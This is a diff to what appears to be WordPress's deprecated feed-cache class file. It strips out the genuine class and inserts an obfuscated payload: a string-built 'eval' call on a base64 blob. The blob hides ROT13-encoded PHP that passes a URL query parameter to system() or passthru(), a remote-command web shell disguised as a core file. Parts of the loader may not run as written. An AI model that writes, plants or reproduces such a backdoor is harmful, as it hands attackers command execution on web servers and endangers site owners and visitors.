@@ -1,49 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Feed API: WP_Feed_Cache class
- *
- * @package WordPress
- * @subpackage Feed
- * @since 4.7.0
- * @deprecated 5.6.0
- */
-
-_deprecated_file(
-	basename( __FILE__ ),
-	'5.6.0',
-	'',
-	__( 'This file is only loaded for backward compatibility with SimplePie 1.2.x. Please consider switching to a recent SimplePie version.' )
-);
-
-/**
- * Core class used to implement a feed cache.
- *
- * @since 2.8.0
- */
-#[AllowDynamicProperties]
-class WP_Feed_Cache extends SimplePie\Cache {
-
-	/**
-	 * Creates a new SimplePie\Cache object.
-	 *
-	 * @since 2.8.0
-	 *
-	 * @param string $location  URL location (scheme is used to determine handler).
-	 * @param string $filename  Unique identifier for cache object.
-	 * @param string $extension 'spi' or 'spc'.
-	 * @return WP_Feed_Cache_Transient Feed cache handler object that uses transients.
-	 */
-	public function create( $location, $filename, $extension ) {
-		return new WP_Feed_Cache_Transient( $location, $filename, $extension );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogU3JycSBOQ1Y6IEpDX1NycnFfUG5wdXIgcHluZmYKICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIFNycnEKICogQGZ2YXByIDQuNy4wCiAqIEBxcmNlcnBuZ3JxIDUuNi4wCiAqLwoKX3FyY2VycG5ncnFfc3Z5cigKCW9uZnJhbnpyKCBfX1NWWVJfXyApLAoJJzUuNi4wJywKCScnLAoJX18oICdHdXZmIHN2eXIgdmYgYmF5bCB5Ym5xcnEgc2JlIG9ucHhqbmVxIHBiemNuZ3Zvdnl2Z2wganZndSBGdnpjeXJDdnIgMS4yLmsuIEN5cm5mciBwYmFmdnFyZSBmanZncHV2YXQgZ2IgbiBlcnByYWcgRnZ6Y3lyQ3ZyIGlyZWZ2YmEuJyApCik7CgovKioKICogUGJlciBweW5mZiBoZnJxIGdiIHZ6Y3lyenJhZyBuIHNycnEgcG5wdXIuCiAqCiAqIEBmdmFwciAyLjguMAogKi8KI1tOeXlialFsYW56dnBDZWJjcmVndnJmXQpweW5mZiBKQ19TcnJxX1BucHVyIHJrZ3JhcWYgRnZ6Y3lyQ3ZyXFBucHVyIHsKCgkvKioKCSAqIFBlcm5ncmYgbiBhcmogRnZ6Y3lyQ3ZyXFBucHVyIGJvd3JwZy4KCSAqCgkgKiBAZnZhcHIgMi44LjAKCSAqCgkgKiBAY25lbnogZmdldmF0ICR5YnBuZ3ZiYSAgSEVZIHlicG5ndmJhIChmcHVyenIgdmYgaGZycSBnYiBxcmdyZXp2YXIgdW5hcXlyZSkuCgkgKiBAY25lbnogZmdldmF0ICRzdnlyYW56ciAgSGF2ZGhyIHZxcmFndnN2cmUgc2JlIHBucHVyIGJvd3JwZy4KCSAqIEBjbmVueiBmZ2V2YXQgJHJrZ3JhZnZiYSAnZmN2JyBiZSAnZmNwJy4KCSAqIEBlcmdoZWEgSkNfU3JycV9QbnB1cl9HZW5hZnZyYWcgU3JycSBwbnB1ciB1bmFxeXJlIGJvd3JwZyBndW5nIGhmcmYgZ2VuYWZ2cmFnZi4KCSAqLwoJY2hveXZwIHNoYXBndmJhIHBlcm5nciggJHlicG5ndmJhLCAkc3Z5cmFuenIsICRya2dyYWZ2YmEgKSB7CgkJZXJnaGVhIGFyaiBKQ19TcnJxX1BucHVyX0dlbmFmdnJhZyggJHlicG5ndmJhLCAkc3Z5cmFuenIsICRya2dyYWZ2YmEgKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
